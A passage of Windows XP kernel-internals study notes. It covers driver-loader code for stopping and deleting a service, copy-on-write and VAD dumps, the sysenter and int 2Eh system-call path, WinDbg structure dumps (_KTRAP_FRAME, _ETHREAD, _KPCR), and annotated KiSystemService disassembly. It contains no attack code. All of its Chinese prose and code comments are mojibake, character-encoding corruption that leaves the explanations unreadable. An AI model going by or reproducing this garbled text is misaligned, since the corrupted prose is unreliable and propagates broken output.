è¦å¹²ä»€ä¹ˆ\")); return; } if (this-\u003escMageger == NULL) { MessageBox(_T(\"è¯·é‡æ–°å¯åŠ¨ï¼ŒæœåŠ¡å™¨æ‰“å¼€å¤±è´¥\"), _T(\"ä½ è¦å¹²ä»€ä¹ˆ\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = OpenService(this-\u003escMageger, fileName, SERVICE_ALL_ACCESS); if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_DOES_NOT_EXIST) { MessageBox(_T(\"æœåŠ¡ä¸å­˜åœ¨\"), _T(\"æç¤º\")); } else { MessageBox(_T(\"æœªçŸ¥é”™è¯¯\"), _T(\"æç¤º\")); } return; } SERVICE_STATUS error = { 0 }; int result = ControlService(serviceHandle, SERVICE_CONTROL_STOP, \u0026error); if (result == 0) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_NOT_ACTIVE) { MessageBox(_T(\"æœåŠ¡æ²¡æœ‰åœ¨è¿è¡Œ\"), _T(\"æç¤º\")); } else { CString str(\"é”™è¯¯å·ä¸º:\" + error); MessageBox(str, _T(\"æç¤º\")); } } CloseServiceHandle(serviceHandle); } æ‰“å¼€æœåŠ¡ä¹‹åç”¨ControlServiceå°†é©±åŠ¨åœæ­¢ã€‚\nå¸è½½é©±åŠ¨\nvoid CDriverLoadDlg::OnBnUnload() { CString path = this-\u003egetFilePath(); if (path.IsEmpty()) { MessageBox(_T(\"æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\"), _T(\"ä½ è¦å¹²ä»€ä¹ˆ\")); return; } if (this-\u003escMageger == NULL) { MessageBox(_T(\"è¯·é‡æ–°å¯åŠ¨ï¼ŒæœåŠ¡å™¨æ‰“å¼€å¤±è´¥\"), _T(\"ä½ è¦å¹²ä»€ä¹ˆ\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = OpenService(this-\u003escMageger, fileName, SERVICE_ALL_ACCESS); if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_DOES_NOT_EXIST) { MessageBox( _T(\"æœåŠ¡å·²ç»ä¸å­˜åœ¨\"),_T(\"æç¤º\")); } else { CString str(\"é”™è¯¯å·ä¸º:\" + error); MessageBox(str, _T(\"æç¤º\")); } return; } if (!DeleteService(serviceHandle)) { DWORD error = GetLastError(); CString str; str.Format(L\"é”™è¯¯å·ä¸º:%d\", error); MessageBox(str, _T(\"æç¤º\")); return; } CloseServiceHandle(serviceHandle); CloseServiceHandle(this-\u003escMageger); this-\u003escMageger = NULL; } æ‰“å¼€æœåŠ¡åè°ƒç”¨DeleteServiceåˆ é™¤æœåŠ¡ã€‚\nå†™æ‹·è´ é¦–å…ˆä¸¤ä¸ªè¿›ç¨‹åŠ è½½åŒä¸€ä¸ªDLLæ—¶ï¼Œé‚£ä¹ˆä»–ä»¬éƒ½ä½¿ç”¨åŒä¸€ä¸ªç‰©ç†é¡µï¼ˆä¹Ÿå°±æ˜¯DLLçš„ç‰©ç†é¡µï¼‰ã€‚\nä¹‹åå¦‚æœæƒ³è®©è¿™ä¸ªDLLè¿›è¡Œå†™æ‹·è´ï¼Œåˆ™å¿…é¡»è®©è¿™ä¸ªDLLçš„ç‰©ç†é¡µå˜ä¸ºåªè¯»çš„ã€‚\nè¿™æ—¶å¦‚æœè¦å†™çš„è¯å°±ä¼šäº§ç”Ÿå¼‚å¸¸ï¼ŒCPUå°±ä¼šåˆ¤æ–­æ˜¯å†™æ‹·è´çš„åªè¯»å¼‚å¸¸è¿˜æ˜¯æ™®é€šçš„åªè¯»å¼‚å¸¸ã€‚\né‚£ä¹ˆCPUå¦‚ä½•åˆ¤æ–­å‘¢ï¼Ÿ\næˆ‘ä»¬çŸ¥é“ä½¿ç”¨VirtualAllocå‡½æ•°å¯ä»¥æŒ‡å®šåœ°å€è¿›è¡Œå†…å­˜çš„åˆ†é…ï¼Œé‚£ä¹ˆè‚¯å®šæœ‰ä¸€ä¸ªä½ç½®è®°å½•è¿™å—åœ°å€æ˜¯å¦è¢«å ç”¨ã€‚\nåœ¨windbgä¸­ä½¿ç”¨æŒ‡ä»¤dt _EPROCESS åœ°å€å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç»“æ„ä½“ï¼Œåœ¨è¿™ä¸ªç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªæˆå‘˜æ˜¯VadRootã€‚è¿™ä¸ªæˆå‘˜æ˜¯ä¸€ä¸ªäºŒå‰æ ‘çš„åœ°å€ï¼Œè¿™ä¸ªäºŒå‰æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½è®°å½•ç€å ç”¨å†…å­˜çš„å¼€å§‹ä½ç½®ã€ç»“æŸä½ç½®ä»¥åŠä»€ä¹ˆç±»å‹ã€‚\n+0x11c VadRoot : 0x895f5ac0 Void è™šæ‹Ÿåœ°å€ä½¿ç”¨æƒ…å†µæŸ¥çœ‹ï¼ˆå•ä½4kbï¼‰ï¼š\nkd\u003e !vad 0x895f5ac0 VAD Level Start End Commit 89887650 3 10 10 1 Private READWRITE 8957e138 4 20 20 1 Private READWRITE 89504ea8 2 30 12f 6 Private READWRITE 8964b9c0 4 130 132 0 Mapped READONLY Pagefile section, shared commit 0x3 8996eb90 3 140 141 0 Mapped READONLY Pagefile section, shared commit 0x2 898db370 5 150 24f 26 Private READWRITE 898a4c98 4 250 25f 6 Private READWRITE 89849768 6 260 26f 0 Mapped READWRITE Pagefile section, shared commit 0x3 89958180 5 270 285 0 Mapped READONLY \\WINDOWS\\system32\\unicode.nls 89439b78 7 290 2d0 0 Mapped READONLY \\WINDOWS\\system32\\locale.nls 89439b48 6 2e0 320 0 Mapped READONLY \\WINDOWS\\system32\\sortkey.nls 8982e460 8 330 335 0 Mapped READONLY \\WINDOWS\\system32\\sorttbls.nls 8982e430 7 340 380 0 Mapped READONLY Pagefile section, shared commit 0x41 895829d0 8 390 39f 5 Private READWRITE 89657368 9 3a0 3a2 0 Mapped READONLY \\WINDOWS\\system32\\ctype.nls 89932958 10 3b0 3bf 8 Private READWRITE 894cf498 11 3c0 3c0 1 Private READWRITE 8996ec58 12 3d0 3d0 1 Private READWRITE 898a6af0 14 3e0 3e1 0 Mapped READONLY Pagefile section, shared commit 0x2 898a6ac0 13 3f0 3f1 0 Mapped READONLY Pagefile section, shared commit 0x2 8964bae0 1 400 4ec 23 Mapped Exe EXECUTE_WRITECOPY \\Documents and Settings\\Administrator\\æ¡Œé¢\\DebugView\\Dbgview86_æ±‰åŒ–.exe 89657338 3 4f0 5b7 0 Mapped EXECUTE_READ Pagefile section, shared commit 0x3 896572d8 2 5c0 6c2 0 Mapped READONLY Pagefile section, shared commit 0x103 8953b368 4 6d0 9cf 0 Mapped EXECUTE_READ Pagefile section, shared commit 0x1b 89649838 5 9d0 a1f 0 Mapped READONLY Pagefile section, shared commit 0x50 8955c3f0 6 a20 a20 0 Mapped READWRITE Pagefile section, shared commit 0x1 89656fd8 3 a30 a6f 0 Mapped READWRITE Pagefile section, shared commit 0x10 89656fa8 4 a70 a7d 0 Mapped READWRITE Pagefile section, shared commit 0xe 894e3ea8 5 a80 b7f 167 Private READWRITE 895f5ac0 0 b80 b80 1 Private READWRITE 8996eeb0 7 b90 b90 0 Private Phys READWRITE 898740d8 6 ba0 ba0 0 Mapped READWRITE Pagefile section, shared commit 0x1 89578590 5 bd0 c4f 1 Private READWRITE 895353a0 7 c50 d4f 2 Private READWRITE 89441280 6 d60 d67 8 Private READWRITE 8993afd8 7 d70 def 0 Mapped READWRITE Pagefile section, shared commit 0x7 89649808 4 5adc0 5adf6 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\uxtheme.dll 8953b338 3 62c20 62c28 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\lpk.dll 89876308 2 71a10 71a17 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ws2help.dll 8982e400 3 71a20 71a36 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ws2_32.dll 898762d8 6 71a90 71aa1 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\mpr.dll 89656f78 11 73640 7366d 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\MSCTFIME.IME 8953b308 10 73fa0 7400a 16 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\usp10.dll 89828008 11 74680 746cb 3 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\MSCTF.dll 89657308 9 76300 7631c 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\imm32.dll 89874078 8 76320 76366 4 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\comdlg32.dll 89656f48 9 76990 76acc 8 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ole32.dll 895f5900 7 77180 77282 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\\comctl32.dll 89876338 5 77be0 77c37 7 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\msvcrt.dll 8964b960 6 77d10 77d9f 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\user32.dll 8982e3d0 4 77da0 77e48 5 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\advapi32.dll 8982e3a0 5 77e50 77ee1 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\rpcrt4.dll 89874008 7 77ef0 77f38 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\gdi32.dll 898740a8 8 77f40 77fb5 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\shlwapi.dll 89876368 6 77fc0 77fd0 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\secur32.dll 894b5238 1 7c800 7c91d 5 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\kernel32.dll 8996ed28 2 7c920 7c9b2 5 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ntdll.dll 89874048 5 7d590 7dd83 30 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\shell32.dll 8996eb60 4 7f6f0 7f7ef 0 Mapped EXECUTE_READ Pagefile section, shared commit 0x7 8964b9f0 3 7ffa0 7ffd2 0 Mapped READONLY Pagefile section, shared commit 0x33 8996ea98 4 7ffd4 7ffd4 1 Private READWRITE 895f5a80 6 7ffde 7ffde 1 Private READWRITE 8996eb00 5 7ffdf 7ffdf 1 Private READWRITE ç”³è¯·å†…å­˜åªæœ‰ä¸¤ä¸ªå‡½æ•°ï¼šVirtualAllocä¸FileMappingï¼ˆå…±äº«å†…å­˜ï¼‰ã€‚ä¹‹å‰çš„mallocå‡½æ•°åªæ˜¯åœ¨ä¸Šé¢çš„é‚£ä¸€å †å†…å­˜ä¸­åˆ’ä¸€å—æ¥ä½¿ç”¨\nå…¶å®å°±æ˜¯äº§ç”Ÿå¼‚å¸¸ï¼ŒCPUåˆ¤æ–­æ˜¯ä¸æ˜¯å†™æ‹·è´ï¼Œå¦‚æœæ˜¯çš„è¯å°±åˆ†é…ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µï¼Œæ‹·è´è¿‡å»å¹¶ä½¿ç”¨æ–°ç‰©ç†é¡µã€‚å¦‚æœæ²¡æœ‰å¼‚å¸¸è‡ªç„¶å°±ä¸ä¼šæœ‰åé¢çš„æ“ä½œäº†ã€‚\nç³»ç»Ÿè°ƒç”¨ è¿›0ç¯å‰ _KUSER_SHARED_DATA\nUserå±‚å’ŒKernelå±‚åˆ†åˆ«å®šä¹‰äº†ä¸€ä¸ª_KUSER_SHARED_DATAç»“æ„åŒºåŸŸï¼Œç”¨äºUserå±‚å’ŒKernelå±‚å…±äº«æŸäº›æ•°æ®ã€‚ï¼ˆå…±äº«åŒºåŸŸæœ‰å¤šå¤§å–å†³äºè¿™ä¸ªç»“æ„ä½“æœ‰å¤šå¤§ï¼‰ å®ƒä»¬ä½¿ç”¨å›ºå®šçš„åœ°å€å€¼æ˜ å°„ï¼Œ_KUSER_SHARED_DATAç»“æ„åŒºåŸŸåœ¨Userå’ŒKernelå±‚åœ°å€åˆ†åˆ«ä¸ºï¼š Userå±‚åœ°å€ä¸ºï¼š0x7ffe0000 Kernnelå±‚åœ°å€ä¸ºï¼š0xffdf0000 è™½ç„¶æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªç‰©ç†é¡µï¼Œä½†åœ¨Userå±‚æ˜¯åªè¯»çš„ï¼Œåœ¨Kernnelå±‚æ˜¯å¯å†™çš„ã€‚ NtReadVirtualMemory\nåœ¨ntdllä¸­å¦‚ä¸‹ï¼š\n.text:7C92D9E0 public ZwReadVirtualMemory .text:7C92D9E0 ZwReadVirtualMemory proc near ; CODE XREF: LdrFindCreateProcessManifest+1CCâ†“p .text:7C92D9E0 ; LdrCreateOutOfProcessImage+7Câ†“p ... .text:7C92D9E0 mov eax, 0BAh ; NtReadVirtualMemoryï¼ˆæœåŠ¡å·ï¼‰ .text:7C92D9E5 mov edx, 7FFE0300h .text:7C92D9EA call dword ptr [edx] .text:7C92D9EC retn 14h .text:7C92D9EC ZwReadVirtualMemory endp å¯ä»¥çœ‹åˆ°æ˜¯calläº†0x7FFE0300åœ°å€çš„ä»£ç ï¼Œè¿™ä¸ªä½ç½®å°±æ˜¯_KUSER_SHARED_DATAç»“æ„ä½“ç¬¬0x300åç§»ã€‚\nä½¿ç”¨dt _KUSER_SHARED_DATA 0x7ffe0000æ‰¾0x300åç§»å¤„ä¸ºï¼š\n+0x300 SystemCall : 0x7c92e4f0 ä½¿ç”¨u 0x7c92e4f0åº”è¯¥å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ï¼š\n.text:7C92E4F0 public KiFastSystemCall .text:7C92E4F0 KiFastSystemCall proc near ; DATA XREF: .text:off_7C923428â†‘o .text:7C92E4F0 mov edx, esp ;ä¿å­˜espå¯„å­˜å™¨ .text:7C92E4F2 sysenter .text:7C92E4F2 KiFastSystemCall endp æˆ–è€…ï¼š\n.text:7C92E500 public KiIntSystemCall .text:7C92E500 KiIntSystemCall proc near ; DATA XREF: .text:off_7C923428â†‘o .text:7C92E500 .text:7C92E500 arg_4 = byte ptr 8 .text:7C92E500 .text:7C92E500 lea edx, [esp+arg_4] .text:7C92E504 int 2Eh ; DOS 2+ internal - EXECUTE COMMAND .text:7C92E504 ; DS:SI -\u003e counted CR-terminated command string .text:7C92E506 retn .text:7C92E506 KiIntSystemCall endp CPUä¼šåˆ¤æ–­ç³»ç»Ÿæ”¯ä¸æ”¯æŒsysenteræŒ‡ä»¤ï¼Œæ”¯æŒå°±åœ¨ä¹‹å‰0x300åç§»å¤„å†™å…¥KiFastSystemCallï¼›ä¸æ”¯æŒå°±ä¼šå¡«å…¥KiIntSystemCall\nå½“é€šè¿‡eax=1æ¥æ‰§è¡ŒcpuidæŒ‡ä»¤æ—¶ï¼Œå¤„ç†å™¨çš„ç‰¹å¾ä¿¡æ¯è¢«æ”¾åœ¨ecxå’Œedxå¯„å­˜å™¨ä¸­ï¼Œå…¶ä¸­edxåŒ…å«äº†ä¸€ä¸ªSEPä½ï¼ˆ11ä½ï¼‰ï¼Œè¯¥ä½æŒ‡æ˜äº†å½“å‰å¤„ç†å™¨çŸ¥å¦æ”¯æŒsysenter/sysexitæŒ‡ä»¤ã€‚ å¦‚æœæ˜¯KiIntSystemCallçš„å½¢å¼è¿›R0çš„è¯ï¼Œéœ€è¦æŸ¥IDTè¡¨ã€‚åœ¨0x2E*8å¤„ä¸ºKiSystemServiceï¼ˆç”¨ä¸­æ–­é—¨æ‹†æ®µé€‰æ‹©å­ï¼‰ã€‚\nå¿«é€Ÿè°ƒç”¨\nä¸­æ–­é—¨è¿›0ç¯ï¼Œéœ€è¦çš„CSã€EIPåœ¨IDTè¡¨ä¸­ï¼Œéœ€è¦æŸ¥å†…å­˜ï¼ˆSSä¸ESPç”±TSSæä¾›ï¼Œå‚æ•°åœ¨æ ˆé‡Œé¢ï¼‰è€ŒCPUå¦‚æœæ”¯æŒsysenteræŒ‡ä»¤æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šæå‰å°†CS/SS/ESP/EIPçš„å€¼å­˜å‚¨åœ¨MSRå¯„å­˜å™¨ä¸­ï¼ŒsysenteræŒ‡ä»¤æ‰§è¡Œæ—¶ï¼ŒCPUä¼šå°†MSRå¯„å­˜å™¨ä¸­çš„å€¼ç›´æ¥å†™å…¥ç›¸å…³å¯„å­˜å™¨ï¼Œæ²¡æœ‰è¯»å†…å­˜çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å«å¿«é€Ÿè°ƒç”¨ï¼Œæœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼\nåœ¨æ‰§è¡ŒsysenteræŒ‡ä»¤ä¹‹å‰ï¼Œæ“ä½œç³»ç»Ÿå¿…é¡»æŒ‡å®š0ç¯çš„CSæ®µã€SSæ®µã€EIPä»¥åŠESPã€‚è€Œåœ¨æœªå…¬å¼€çš„MSRå¯„å­˜å™¨ä¸­å°±å­˜ç€è¿™äº›å€¼ï¼š\nMSR Index IA32_SYSENTER_CS 174H IA32_SYSENTER_ESP 175H IA32_SYSENTER_EIP 176H ç„¶åSSæ˜¯ç»è¿‡è®¡ç®—å¾—åˆ°ï¼šCSçš„å€¼+8\nåœ¨windbgä¸­å¯ä»¥ä½¿ç”¨rdmsr xxxæŒ‡ä»¤æŸ¥çœ‹å¯¹åº”çš„MSRå¯„å­˜å™¨ï¼Œé€šè¿‡è¿™ç§æ–¹å¼è¿›å†…æ ¸çš„å‡½æ•°ä¸ºKiFastCallEntry\næ€»ç»“ï¼š\né€šè¿‡ä¸­æ–­é—¨è¿›0ç¯ï¼š å›ºå®šä¸­æ–­å·ä¸º0x2E CS/EIPç”±é—¨æè¿°ç¬¦æä¾›ï¼ŒESP/SSç”±TSSæä¾› è¿›0ç¯åæ‰§è¡Œçš„å†…æ ¸å‡½æ•°ï¼šNT!KiSystemService é€šè¿‡sysenterè¿›0ç¯ï¼š CS/ESP/EIPç”±MSRå¯„å­˜å™¨æä¾›ï¼ˆSSæ˜¯ç®—å‡ºæ¥çš„ï¼‰ è¿›å…¥0ç¯åæ‰§è¡Œçš„å†…æ ¸å‡½æ•°ï¼šNT!KiFastCallEntry è¿›0ç¯åï¼ˆä¿å­˜ç°åœºï¼‰ å‡ ä¸ªé‡è¦çš„ç»“æ„ä½“ï¼š\nTrap_Frame\næ— è®ºä½¿ç”¨è¿™ä¸¤ç§æ–¹å¼çš„å“ªä¸€ç§è¿›0ç¯ï¼Œåœ¨ä¸‰ç¯çš„å¯„å­˜å™¨éƒ½ä¼šå­˜åˆ°è¿™ä¸ªç»“æ„ä½“ä¸­ã€‚ç”±windowsæ“ä½œç³»ç»Ÿç»´æŠ¤çš„ã€‚\nkd\u003e dt _KTrap_Frame nt!_KTRAP_FRAME +0x000 DbgEbp : Uint4B +0x004 DbgEip : Uint4B +0x008 DbgArgMark : Uint4B +0x00c DbgArgPointer : Uint4B +0x010 TempSegCs : Uint4B +0x014 TempEsp : Uint4B +0x018 Dr0 : Uint4B +0x01c Dr1 : Uint4B +0x020 Dr2 : Uint4B +0x024 Dr3 : Uint4B +0x028 Dr6 : Uint4B +0x02c Dr7 : Uint4B +0x030 SegGs : Uint4B +0x034 SegEs : Uint4B +0x038 SegDs : Uint4B +0x03c Edx : Uint4B +0x040 Ecx : Uint4B +0x044 Eax : Uint4B +0x048 PreviousMode : Uint4B +0x04c ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD +0x050 SegFs : Uint4B +0x054 Edi : Uint4B +0x058 Esi : Uint4B +0x05c Ebx : Uint4B +0x060 Ebp : Uint4B +0x064 ErrCode : Uint4B +0x068 Eip : Uint4B +0x06c SegCs : Uint4B +0x070 EFlags : Uint4B +0x074 HardwareEsp : Uint4B +0x078 HardwareSegSs : Uint4B +0x07c V86Es : Uint4B +0x080 V86Ds : Uint4B +0x084 V86Fs : Uint4B +0x088 V86Gs : Uint4B _ETHREAD\nçº¿ç¨‹ç›¸å…³çš„ç»“æ„ä½“ã€‚\nkd\u003e dt _ETHREAD nt!_ETHREAD +0x000 Tcb : _KTHREAD +0x1c0 CreateTime : _LARGE_INTEGER +0x1c0 NestedFaultCount : Pos 0, 2 Bits +0x1c0 ApcNeeded : Pos 2, 1 Bit +0x1c8 ExitTime : _LARGE_INTEGER +0x1c8 LpcReplyChain : _LIST_ENTRY +0x1c8 KeyedWaitChain : _LIST_ENTRY +0x1d0 ExitStatus : Int4B +0x1d0 OfsChain : Ptr32 Void +0x1d4 PostBlockList : _LIST_ENTRY +0x1dc TerminationPort : Ptr32 _TERMINATION_PORT +0x1dc ReaperLink : Ptr32 _ETHREAD +0x1dc KeyedWaitValue : Ptr32 Void +0x1e0 ActiveTimerListLock : Uint4B +0x1e4 ActiveTimerListHead : _LIST_ENTRY +0x1ec Cid : _CLIENT_ID +0x1f4 LpcReplySemaphore : _KSEMAPHORE +0x1f4 KeyedWaitSemaphore : _KSEMAPHORE +0x208 LpcReplyMessage : Ptr32 Void +0x208 LpcWaitingOnPort : Ptr32 Void +0x20c ImpersonationInfo : Ptr32 _PS_IMPERSONATION_INFORMATION +0x210 IrpList : _LIST_ENTRY +0x218 TopLevelIrp : Uint4B +0x21c DeviceToVerify : Ptr32 _DEVICE_OBJECT +0x220 ThreadsProcess : Ptr32 _EPROCESS +0x224 StartAddress : Ptr32 Void +0x228 Win32StartAddress : Ptr32 Void +0x228 LpcReceivedMessageId : Uint4B +0x22c ThreadListEntry : _LIST_ENTRY +0x234 RundownProtect : _EX_RUNDOWN_REF +0x238 ThreadLock : _EX_PUSH_LOCK +0x23c LpcReplyMessageId : Uint4B +0x240 ReadClusterSize : Uint4B +0x244 GrantedAccess : Uint4B +0x248 CrossThreadFlags : Uint4B +0x248 Terminated : Pos 0, 1 Bit +0x248 DeadThread : Pos 1, 1 Bit +0x248 HideFromDebugger : Pos 2, 1 Bit +0x248 ActiveImpersonationInfo : Pos 3, 1 Bit +0x248 SystemThread : Pos 4, 1 Bit +0x248 HardErrorsAreDisabled : Pos 5, 1 Bit +0x248 BreakOnTermination : Pos 6, 1 Bit +0x248 SkipCreationMsg : Pos 7, 1 Bit +0x248 SkipTerminationMsg : Pos 8, 1 Bit +0x24c SameThreadPassiveFlags : Uint4B +0x24c ActiveExWorker : Pos 0, 1 Bit +0x24c ExWorkerCanWaitUser : Pos 1, 1 Bit +0x24c MemoryMaker : Pos 2, 1 Bit +0x250 SameThreadApcFlags : Uint4B +0x250 LpcReceivedMsgIdValid : Pos 0, 1 Bit +0x250 LpcExitThreadCalled : Pos 1, 1 Bit +0x250 AddressSpaceOwner : Pos 2, 1 Bit +0x254 ForwardClusterOnly : UChar +0x255 DisablePageFaultClustering : UChar +0x258 KernelStackReference : Uint4B å…¶ä¸­ï¼ŒTcbæˆå‘˜åˆæ˜¯ä¸€ä¸ªå­ç»“æ„ä½“ï¼š\nkd\u003e dt _KTHREAD nt!_KTHREAD +0x000 Header : _DISPATCHER_HEADER +0x010 MutantListHead : _LIST_ENTRY +0x018 InitialStack : Ptr32 Void +0x01c StackLimit : Ptr32 Void +0x020 Teb : Ptr32 Void +0x024 TlsArray : Ptr32 Void +0x028 KernelStack : Ptr32 Void +0x02c DebugActive : UChar +0x02d State : UChar +0x02e Alerted : [2] UChar +0x030 Iopl : UChar +0x031 NpxState : UChar +0x032 Saturation : Char +0x033 Priority : Char +0x034 ApcState : _KAPC_STATE +0x04c ContextSwitches : Uint4B +0x050 IdleSwapBlock : UChar +0x051 VdmSafe : UChar +0x052 Spare0 : [2] UChar +0x054 WaitStatus : Int4B +0x058 WaitIrql : UChar +0x059 WaitMode : Char +0x05a WaitNext : UChar +0x05b WaitReason : UChar +0x05c WaitBlockList : Ptr32 _KWAIT_BLOCK +0x060 WaitListEntry : _LIST_ENTRY +0x060 SwapListEntry : _SINGLE_LIST_ENTRY +0x068 WaitTime : Uint4B +0x06c BasePriority : Char +0x06d DecrementCount : UChar +0x06e PriorityDecrement : Char +0x06f Quantum : Char +0x070 WaitBlock : [4] _KWAIT_BLOCK +0x0d0 LegoData : Ptr32 Void +0x0d4 KernelApcDisable : Uint4B +0x0d8 UserAffinity : Uint4B +0x0dc SystemAffinityActive : UChar +0x0dd PowerState : UChar +0x0de NpxIrql : UChar +0x0df InitialNode : UChar +0x0e0 ServiceTable : Ptr32 Void +0x0e4 Queue : Ptr32 _KQUEUE +0x0e8 ApcQueueLock : Uint4B +0x0f0 Timer : _KTIMER +0x118 QueueListEntry : _LIST_ENTRY +0x120 SoftAffinity : Uint4B +0x124 Affinity : Uint4B +0x128 Preempted : UChar +0x129 ProcessReadyQueue : UChar +0x12a KernelStackResident : UChar +0x12b NextProcessor : UChar +0x12c CallbackStack : Ptr32 Void +0x130 Win32Thread : Ptr32 Void +0x134 TrapFrame : Ptr32 _KTRAP_FRAME +0x138 ApcStatePointer : [2] Ptr32 _KAPC_STATE +0x140 PreviousMode : Char +0x141 EnableStackSwap : UChar +0x142 LargeStack : UChar +0x143 ResourceIndex : UChar +0x144 KernelTime : Uint4B +0x148 UserTime : Uint4B +0x14c SavedApcState : _KAPC_STATE +0x164 Alertable : UChar +0x165 ApcStateIndex : UChar +0x166 ApcQueueable : UChar +0x167 AutoAlignment : UChar +0x168 StackBase : Ptr32 Void +0x16c SuspendApc : _KAPC +0x19c SuspendSemaphore : _KSEMAPHORE +0x1b0 ThreadListEntry : _LIST_ENTRY +0x1b8 FreezeCount : Char +0x1b9 SuspendCount : Char +0x1ba IdealProcessor : UChar +0x1bb DisableBoost : UChar KPCR\nCPUæ§åˆ¶åŒºï¼ˆProcessor Control Regionï¼‰ï¼Œæè¿°å½“å‰CPUçš„å„ç§çŠ¶æ€\nkd\u003e dt _KPCR nt!_KPCR +0x000 NtTib : _NT_TIB +0x01c SelfPcr : Ptr32 _KPCR +0x020 Prcb : Ptr32 _KPRCB +0x024 Irql : UChar +0x028 IRR : Uint4B +0x02c IrrActive : Uint4B +0x030 IDR : Uint4B +0x034 KdVersionBlock : Ptr32 Void +0x038 IDT : Ptr32 _KIDTENTRY +0x03c GDT : Ptr32 _KGDTENTRY +0x040 TSS : Ptr32 _KTSS +0x044 MajorVersion : Uint2B +0x046 MinorVersion : Uint2B +0x048 SetMember : Uint4B +0x04c StallScaleFactor : Uint4B +0x050 DebugActive : UChar +0x051 Number : UChar +0x052 Spare0 : UChar +0x053 SecondLevelCacheAssociativity : UChar +0x054 VdmAlert : Uint4B +0x058 KernelReserved : [14] Uint4B +0x090 SecondLevelCacheSize : Uint4B +0x094 HalReserved : [16] Uint4B +0x0d4 InterruptMode : Uint4B +0x0d8 Spare1 : UChar +0x0dc KernelReserved2 : [17] Uint4B +0x120 PrcbData : _KPRCB _KiSystemServise\nå¯ä»¥å¯¹æ¯”ä¸‹é¢çš„è¿™å¼ å›¾ï¼ˆç´«è‰²çš„æˆå‘˜åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹æ²¡æœ‰è¢«ä½¿ç”¨ï¼‰ï¼š\n.text:00407631 _KiSystemService proc near ; CODE XREF: ZwAcceptConnectPort(x,x,x,x,x,x)+Câ†‘p .text:00407631 ; ZwAccessCheck(x,x,x,x,x,x,x,x)+Câ†‘p ... .text:00407631 .text:00407631 arg_0 = dword ptr 4 .text:00407631 .text:00407631 push 0 ; åœ¨æ‰§è¡Œè¿™ä¸€è¡Œæ—¶0x68~0x78å·²ç»å‹å…¥æ ˆä¸­äº†ï¼Œæ‰€ä»¥è¿™ä¸ª0æ˜¯å‹å…¥ErrCode .text:00407633 push ebp .text:00407634 push ebx .text:00407635 push esi .text:00407636 push edi .text:00407637 push fs ; åˆ°è¿™é‡Œæ˜¯å‹å…¥å›¾ä¸­ç»¿è‰²çš„å¯„å­˜å™¨ï¼ˆåˆ°0x50ï¼‰ .text:00407639 mov ebx, 30h ; '0' .text:0040763E mov fs, ebx ; å°†0x30ä½œä¸ºæ®µé€‰æ‹©å­åŠ è½½åˆ°FSæ®µå¯„å­˜å™¨ä¸­ .text:0040763E ; 0x30 =\u003e 0011 0 0 00 .text:0040763E ; æ˜¯æŸ¥GDTè¡¨ç´¢å¼•ä¸º6çš„æ®µæè¿°ç¬¦ï¼š .text:0040763E ; ffc093df`f0000001 .text:0040763E ; addr = ffdff000 .text:0040763E ; addræŒ‡å‘cpuçš„_KPCRç»“æ„ .text:00407640 push dword ptr ds:0FFDFF000h ; å‹å…¥æ—§çš„ExecptionList(å›¾ä¸­çš„0x4c) .text:00407640 ; å°±æ˜¯ç¬¬ä¸€ä¸ªå­æˆå‘˜çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼ˆ_KPCR[0] =\u003e _TIB[0] =\u003e ExecptionListï¼‰ .text:00407646 mov dword ptr ds:0FFDFF000h, -1 ; å°†æ–°çš„ExecptionListç½®ä¸º-1 .text:00407650 mov esi, ds:0FFDFF124h ; _KPCR[0x120] =\u003e _KPCB[0x4] =\u003e CurrentThread(å½“å‰CPUæ‰€æ‰§è¡Œçº¿ç¨‹çš„_ETHREAD) .text:00407656 push dword ptr [esi+140h] ; _ETHREAD[0x140] =\u003e _KTHREAD[0x140] =\u003e PreviousMode(å…ˆå‰æ¨¡å¼) .text:0040765C sub esp, 48h ; æå‡å †æ ˆåˆ°å›¾ä¸­çš„0x00çš„ä½ç½® .text:0040765F mov ebx, [esp+68h+arg_0] ; 